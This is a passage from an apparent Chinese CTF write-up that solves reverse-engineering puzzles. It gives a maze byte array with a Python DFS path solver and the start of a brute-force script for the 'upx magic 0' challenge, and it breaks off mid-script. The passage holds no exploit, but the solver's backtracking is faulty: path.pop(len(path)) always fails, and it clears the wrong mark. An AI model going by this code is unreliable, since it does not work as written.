class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x20</span>]</span><br><span class="line"><span class="comment">#print(chr(map[65]))</span></span><br><span class="line"><span class="comment"># for i in range(len(map)):</span></span><br><span class="line"><span class="comment">#     #print(i,end=&#x27;:&#x27;)</span></span><br><span class="line"><span class="comment">#     print(chr(map[i]),end=&#x27; &#x27;)</span></span><br><span class="line"><span class="comment">#     if ((i + 1) % 64 == 0):</span></span><br><span class="line"><span class="comment">#         print(end=&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">path=[]</span><br><span class="line">mark=[<span class="number">0</span>]*<span class="number">4096</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">index</span>):</span></span><br><span class="line">    <span class="keyword">global</span> path</span><br><span class="line">    newindex = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(index==<span class="number">4095</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">            print(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    way=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    newindex=index+<span class="number">512</span></span><br><span class="line">    <span class="keyword">if</span>(newindex&lt;<span class="number">4096</span> <span class="keyword">and</span> <span class="built_in">map</span>[newindex]==<span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>) <span class="keyword">and</span> mark[newindex]==<span class="number">0</span>  ):</span><br><span class="line">        path.append(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        mark[newindex]=<span class="number">1</span></span><br><span class="line">        dfs(newindex)</span><br><span class="line">        mark[index]=<span class="number">0</span></span><br><span class="line">        path.pop(<span class="built_in">len</span>(path))</span><br><span class="line"></span><br><span class="line">    way = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    newindex = index + <span class="number">64</span></span><br><span class="line">    <span class="keyword">if</span> (newindex&lt;<span class="number">4096</span> <span class="keyword">and</span> <span class="built_in">map</span>[newindex] == <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>) <span class="keyword">and</span> mark[newindex] == <span class="number">0</span> ):</span><br><span class="line">        path.append(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        mark[newindex] = <span class="number">1</span></span><br><span class="line">        dfs(newindex)</span><br><span class="line">        mark[index] = <span class="number">0</span></span><br><span class="line">        path.pop(<span class="built_in">len</span>(path))</span><br><span class="line"></span><br><span class="line">    way = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">    newindex = index + <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> (newindex&lt;<span class="number">4096</span> <span class="keyword">and</span> <span class="built_in">map</span>[newindex] == <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>) <span class="keyword">and</span> mark[newindex] == <span class="number">0</span>):</span><br><span class="line">        path.append(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        mark[newindex] = <span class="number">1</span></span><br><span class="line">        dfs(newindex)</span><br><span class="line">        mark[index] = <span class="number">0</span></span><br><span class="line">        path.pop(<span class="built_in">len</span>(path))</span><br><span class="line"></span><br><span class="line">    way = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">    newindex = index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (newindex&lt;<span class="number">4096</span> <span class="keyword">and</span> <span class="built_in">map</span>[newindex] == <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>) <span class="keyword">and</span> mark[newindex] == <span class="number">0</span>):</span><br><span class="line">        path.append(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        mark[newindex] = <span class="number">1</span></span><br><span class="line">        dfs(newindex)</span><br><span class="line">        mark[index] = <span class="number">0</span></span><br><span class="line">        path.pop(<span class="built_in">len</span>(path))</span><br><span class="line"></span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#3120113031203203222231003011</span></span><br></pre></td></tr></table></figure><h3 id="upx-magic-0"><a href="#upx-magic-0" class="headerlink" title="upx magic 0"></a>upx magic 0</h3><p>和upx没关系，单字节加密，复制ida中的算法，然后爆破即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">enc = [<span class="number">0x8d68</span>, <span class="number">0x9d49</span>, <span class="number">0x2a12</span>, <span class="number">0xab1a</span>, <span class="number">0xcbdc</span>, <span class="number">0xb92b</span>, <span class="number">0x2e32</span>, <span class="number">0x9f59</span>, <span class="number">0xddcd</span>, <span class="number">0x9d49</span>, <span class="number">0xa90a</span>, <span class="number">0xe70</span>, <span class="number">0xf5cf</span>, <span class="number">0xa50</span>,</span><br><span class="line">       <span class="number">0x5af5</span>, <span class="number">0xff9f</span>, <span class="number">0x9f59</span>, <span class="number">0xbd0b</span>, <span class="number">0x58e5</span>, <span class="number">0x3823</span>, <span class="number">0xbf1b</span>, <span class="number">0x78a7</span>, <span class="number">0xab1a</span>, <span class="number">0x48c4</span>, <span class="number">0xa90a</span>, <span class="number">0x2c22</span>, <span class="number">0x9f59</span>, <span class="number">0x5cc5</span>,</span><br><span class="line">       <span class="number">0x5ed5</span>, <span class="number">0x78a7</span>, <span class="number">0x2672</span>, <span class="number">0x5695</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">      temp = f &lt;&lt; <span class="number">8</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">          <span class="keyword">if</span> ((temp &amp; <span class="number">0x8000</span>) != <span class="number">0</span>):</span><br><span class="line">              temp = (<span class="number">2</span> * temp) ^ <span class="number">0x1021</span></span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">              temp *= <span class="number">2</span></span><br><span class="line">      <span 